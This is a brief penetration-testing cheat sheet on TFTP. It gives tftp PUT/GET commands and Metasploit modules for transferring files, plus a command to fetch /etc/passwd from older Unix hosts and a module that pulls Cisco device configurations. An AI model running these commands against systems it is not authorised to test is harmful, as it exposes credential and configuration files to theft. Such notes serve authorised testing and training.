# TFTP

## Enumeration
```bash
tftp [IP] PUT [local file location].[extension]
```
```bash
tftp [IP] GET [remote file location].[extension]
```

### Metasploit

##### tftp_transfer
```bash
use auxiliary/admin/tftp/tftp_transfer
set RHOSTS [IP]
set ACTION [DOWNLOAD | UPLOAD]
set REMOTE_FILE [e.g., config.txt]
set LOCAL_FILE [e.g., loot.txt]
run
```


---
---


## Exploitation
##### Older versions of Unix may allow GET on /etc/passwd.
```bash
tftp -i [IP] GET /etc/passwd
```

### Metasploit

##### tftp_transfer
```bash
use auxiliary/admin/tftp/tftp_transfer
set RHOSTS [IP]
set ACTION [DOWNLOAD | UPLOAD]
set REMOTE_FILE [e.g., config.txt]
set LOCAL_FILE [e.g., loot.txt]
run
```

##### cisco_config_tftp
```bash
use auxiliary/admin/cisco/cisco_config_tftp
set RHOSTS [IP]
run
```

